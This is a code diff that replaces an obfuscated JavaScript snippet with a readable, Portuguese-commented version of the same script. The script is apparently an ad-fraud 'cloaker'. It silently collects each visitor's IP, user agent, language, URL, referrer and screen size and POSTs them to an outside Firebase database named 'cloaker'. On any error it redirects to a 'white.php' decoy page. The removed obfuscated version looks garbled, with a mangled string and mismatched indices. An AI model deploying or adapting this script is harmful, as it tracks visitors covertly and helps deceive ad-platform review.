@@ -1,1 +1,35 @@
-(function(){var _0x5e8d=["\x66\x65\x74\x63\x68","\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x70696f\x2e\x69\x6f\x2f\x6a\x73\x6f\x6e","\x2f\x6a\x73\x6f\x6e","\x69\x6e\x69\x74","\x72\x65\x6c\x61\x74\x69\x76\x65","\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x64\x73\x2d\x62\x6c\x61\x63\x6b\x2d\x64\x69\x67\x69\x74\x61\x6c\x2d\x64\x65\x66\x61\x75\x6c\x74\x2d\x72\x74\x64\x62\x2e\x66\x69\x72\x65\x62\x61\x73\x65\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x63\x6c\x6f\x61\x6b\x65\x72","\x67\x65\x74\x43\x6f\x6f\x6b\x69\x65\x72","ip","\x6a\x73\x6f\x6e","\x75\x73\x65\x72\x41\x67\x65\x6e\x74","\x6c\x61\x6e\x67\x75\x61\x67\x65","\x70\x61\x67\x65","\x64\x6f\x6d\x61\x69\x6e","\x68\x72\x65\x66\x65\x72","\x73\x63\x72\x65\x65\x6e\x53\x69\x7a\x65","\x66\x6f\x72\x65\x61\x63\x68","\x6a\x73\x6f\x6e","\x67\x65\x74\x55\x72\x6c","\x61\x74\x6f\x62","\x74\x61\x72\x67\x65\x74\x42\x72\x6f\x77\x73\x65\x72\x4e\x65\x78\x74","\x64\x61\x74\x61","error","\x72\x65\x66\x65\x72","\x66\x72\x6f\x6d\x43\x68\x65\x63\x6b\x65\x72"];const _0x51a4=_0x5e8d[0];(async function(){try{const _0x5e8e=_0x5e8d[1];const _0x5f50=await fetch(_0x5e8e);const _0x37a8=await _0x5f50.json();return _0x37a8[_0x5e8d[2]];}catch(e){return _0x5e8d[3];}})().then(async function(){const _0x3858={};_0x3858[_0x5e8d[4]]=(await fetch(_0x5e8d[1])).ip,_0x3858[_0x5e8d[6]]=window.location.hostname,_0x3858[_0x5e8d[7]]=navigator.userAgent,_0x3858[_0x5e8d[8]]=navigator.language||"",_0x3858[_0x5e8d[9]]=window.location.href,_0x3858[_0x5e8d[10]]=document.referrer||"","screenSize":`${window.screen.width}x${window.screen.height}`;try{const _0x1a52=await fetch(_0x5e8d[12],{"method":"POST","headers":{"Content-Type":"application/json"},"body":JSON.stringify(_0x3858)});if(!_0x1a52.ok)throw new Error(_0x5e8d[13]);console.log(_0x1a52[_0x5e8d[14]]());}catch(e){console[_0x5e8d[15]](_0x5e8d[16]),window.location.href=_0x5e8d[17];}})();
+(async function() {
+    try {
+        const ipData = await fetch('https://ipinfo.io/json');  // Pega os dados de IP
+        const ipInfo = await ipData.json();
+
+        const postData = {
+            ip: ipInfo.ip,  // Obtém o IP
+            domain: window.location.hostname,  // Pega o domínio
+            userAgent: navigator.userAgent,  // Pega o User Agent
+            language: navigator.language,  // Pega a linguagem do navegador
+            page: window.location.href,  // URL da página
+            referer: document.referrer,  // URL de onde o usuário veio
+            screenSize: `${window.innerWidth}x${window.innerHeight}`  // Tamanho da tela
+        };
+
+        // Fazendo o POST para o Firebase
+        const response = await fetch('https://ads-black-digital-default-rtdb.firebaseio.com/cloaker.json', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(postData)
+        });
+
+        if (!response.ok) {
+            throw new Error('Erro ao enviar dados');
+        }
+
+        console.log("Dados enviados com sucesso!");
+    } catch (error) {
+        console.error('Erro:', error);
+        // Em caso de erro, redireciona para "white.php"
+        window.location.href = 'white.php';
+    }
+})();
